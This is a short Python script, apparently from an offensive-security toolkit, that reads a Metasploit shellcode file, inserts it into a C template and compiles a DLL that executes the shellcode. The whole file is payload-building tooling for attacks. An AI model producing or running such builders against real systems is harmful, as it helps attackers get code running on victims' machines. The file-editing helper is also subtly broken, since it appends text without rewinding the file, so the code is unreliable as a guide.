import subprocess
import os

def clearFile(filename):
    """
    -_-
    """
    with open(filename, 'w'): pass

def replaceInFile(filename, dest, src):
    with open(filename, "r+") as inn:
        data = inn.read()
        new = data.replace(dest, src)
        inn.write(new)



def build_msf_dll():
    """
    build dll that executes metasploit shellcode
    """
    shellcodeFile = input("[+] Enter Path to Shellcode file : ")
    try:
        with open(shellcodeFile, "r+") as readin_code:
            c_array_msf = readin_code.read()
            print("[+] Using : ")
            print(c_array_msf)

            print("[i] Writing to Source DLL file.")
            with open("msf.c", "r+") as source_file:
                source_code = source_file.read()
                replaceInFile("msf.c","{{shellcodehere}}", c_array_msf)
                if(os.name == "nt"):
                    subprocess.call(["mingw32-make", "msf"])
                else:
                    subprocess.call(["make", "msf"])

                if(not os.path.isfile("msf.dll")):
                    print("[X] An Error occured when building Dll.")
                else:
                   replaceInFile("msf.c",c_array_msf, "{{shellcodehere}}")
    except Exception as e:
        print("[X] Error : " + str(e))
